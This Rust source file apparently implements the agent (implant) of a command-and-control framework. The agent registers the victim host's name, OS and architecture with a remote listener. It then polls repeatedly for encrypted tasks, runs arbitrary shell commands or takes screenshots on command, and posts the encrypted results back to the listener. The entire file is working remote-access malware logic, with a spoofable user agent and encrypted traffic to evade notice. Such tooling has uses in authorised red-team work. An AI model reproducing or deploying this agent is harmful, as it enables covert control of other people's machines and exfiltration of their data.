use reqwest::header::{HeaderMap, USER_AGENT};
use std::{
    collections::HashMap,
    io::{self, Write},
    thread,
    time,
    process::Command
};

use crate::{
    core::{
        postdata::{CipherData, PlainData, RegisterAgentData},
        tasks::{
            linux::shell::shell,
            screenshot::screenshot
        }
    },
    Config,
    crypto::aesgcm::{cipher, decipher, EncMessage},
    utils::random::random_name, config::listener,
};

pub async fn run(config: Config) -> Result<(), std::io::Error> {
    let sleep = time::Duration::from_secs(config.sleep);

    // Get agent into for registration
    let agent_name =  random_name("agent".to_owned());
    let hostname = match Command::new("hostname").output() {
        Ok(h) => {
            String::from_utf8(h.stdout).unwrap().trim().to_string()
        },
        _ => String::from("unknown"),
    };
    let os = std::env::consts::OS.to_string();
    let arch = std::env::consts::ARCH.to_string();
    let listener_url = format!(
        "{}://{}:{}/",
        config.listener.proto.to_string(),
        config.listener.host.to_string(),
        config.listener.port.to_owned(),
    );

    let rad = RegisterAgentData::new(
        agent_name.to_string(),
        hostname,
        os,
        arch,
        listener_url.to_string(),
        config.my_public_key,
    );

    // Initialize client
    let mut client = reqwest::Client::new();

    // Prepare HTTP request headers
    let mut headers = HeaderMap::new();
    headers.insert(USER_AGENT, config.listener.user_agent.parse().unwrap());

    // Agent registration process
    let mut registered = false;
    while !registered {
        thread::sleep(sleep);
    
        // Register agent
        let response = match client
            .post(format!("{}{}", listener_url.to_string(), "r"))
            .headers(headers.clone())
            .json(&rad)
            .send()
            .await
        {
            Ok(resp) => {
                registered = true;
                resp.text().await.unwrap()
            },
            Err(_) => continue,
        };
        // println!("{}", response);
    }

    let plaindata = PlainData::new(agent_name.to_string());

    loop {
        // TODO: Implement graceful shutdown

        thread::sleep(sleep);

        // Get task
        let task = match client
            .post(format!("{}{}", listener_url.to_string(), "t/a"))
            .headers(headers.clone())
            .json(&plaindata)
            .send()
            .await
        {
            Ok(resp) => {
                let resp = resp.text().await.unwrap();
                if resp == "" {
                    continue;
                }

                let cipherdata: CipherData = serde_json::from_str(&resp).unwrap();
                let deciphered_task = decipher(
                    EncMessage { ciphertext: cipherdata.c, nonce: cipherdata.n },
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                );
                String::from_utf8(deciphered_task).unwrap()
            },
            Err(e) => {
                continue;
            }
        };

        // println!("Task: {task}");

        // Execute task
        let task_args = match shellwords::split(&task) {
            Ok(args) => args,
            Err(_) => continue,
        };

        if task_args.len() == 0 {
            continue;
        }

        match task_args[0].as_str() {
            "screenshot" => {
                match screenshot().await {
                    Ok(result) => {
                        let cipherdata = CipherData::new(
                            agent_name.to_string(),
                            &result,
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                        );

                        client
                            .post(format!("{}{}", listener_url.to_string(), "t/r"))
                            .headers(headers.clone())
                            .json(&cipherdata)
                            .send()
                            .await;
                    }
                    Err(e) => {
                        let cipherdata = CipherData::new(
                            agent_name.to_string(),
                            e.to_string().as_bytes(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                        );

                        client
                            .post(format!("{}{}", listener_url.to_string(), "t/r"))
                            .headers(headers.clone())
                            .json(&cipherdata)
                            .send()
                            .await;
                    }
                }
            }
            "shell" => {
                match shell(task_args[1..].join(" ").to_string()).await {
                    Ok(result) => {
                        let cipherdata = CipherData::new(
                            agent_name.to_string(),
                            &result,
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                        );

                        client
                            .post(format!("{}{}", listener_url.to_string(), "t/r"))
                            .headers(headers.clone())
                            .json(&cipherdata)
                            .send()
                            .await;
                    }
                    Err(e) => {
                        let cipherdata = CipherData::new(
                            agent_name.to_string(),
                            e.to_string().as_bytes(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                        );

                        client
                            .post(format!("{}{}", listener_url.to_string(), "t/r"))
                            .headers(headers.clone())
                            .json(&cipherdata)
                            .send()
                            .await;
                    }
                }
            }
            _ => {
                continue;
            }
        }
    }
    
    Ok(())
}